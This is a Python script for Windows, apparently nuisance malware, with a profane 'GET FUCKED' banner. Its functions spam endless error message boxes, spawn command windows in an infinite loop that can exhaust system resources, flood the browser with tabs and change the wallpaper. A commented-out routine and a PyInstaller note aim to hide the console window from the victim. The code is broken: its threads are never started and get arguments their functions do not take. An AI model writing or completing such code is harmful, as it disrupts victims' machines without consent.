"""Importing modules"""
import ctypes
import win32gui
import win32.lib.win32con as win32con
import os
import webbrowser
import random
from time import sleep
import threading

# <---------->

if os.name != 'nt':
    exit("Not windows")

# <---------->

LOGIN_MSG = r"""
 ______     ______     ______      ______   __  __     ______     __  __     ______     _____
/\  ___\   /\  ___\   /\__  _\    /\  ___\ /\ \/\ \   /\  ___\   /\ \/ /    /\  ___\   /\  __-.
\ \ \__ \  \ \  __\   \/_/\ \/    \ \  __\ \ \ \_\ \  \ \ \____  \ \  _"-.  \ \  __\   \ \ \/\ \
 \ \_____\  \ \_____\    \ \_\     \ \_\    \ \_____\  \ \_____\  \ \_\ \_\  \ \_____\  \ \____-
  \/_____/   \/_____/     \/_/      \/_/     \/_____/   \/_____/   \/_/\/_/   \/_____/   \/____/

"""  # http://patorjk.com/software/taag/#p=display&f=Sub-Zero&t=GET%20FUCKED


def login():
    """Print login msg"""
    print(LOGIN_MSG)

# <---------->


#def hide():  # USE PYINSTALLER "--window" OPTION (https://bit.ly/3C6myWa)
#    """Hide cmd window"""
#    thisprogramm = win32gui.GetForegroundWindow()
#    win32gui.ShowWindow(thisprogramm, win32con.SW_HIDE)

# <---------->


def spam_msgbox():
    """Spam user with windows"""
    while True:
        ctypes.windll.user32.MessageBoxW(0, "GET FUCKED", "LMAO", 16)


def spam_cmd():
    """Spam user with cmd"""
    while True:
        os.system("start")

def change_wallpaper():
    ctypes.windll.user32.SystemParametersInfoA(20, 0, "logo.png", 0)


def spam_tabs():
    """Spam user with tabs"""
    urls = ["https://www.youtube.com/watch?v=dQw4w9WgXcQ", "https://www.youtube.com/watch?v=d1YBv2mWll0"]
    while True:
        sleep(0.1)
        webbrowser.open_new_tab(random.choice(urls))

# <---------->

x1 = threading.Thread(target=spam_tabs, args=(1,))
x2 = threading.Thread(target=spam_cmd, args=(1,))
x3 = threading.Thread(target=spam_msgbox, args=(1,))
x4 = threading.Thread(target=change_wallpaper, args=(1,))

# <---------->

print(LOGIN_MSG)
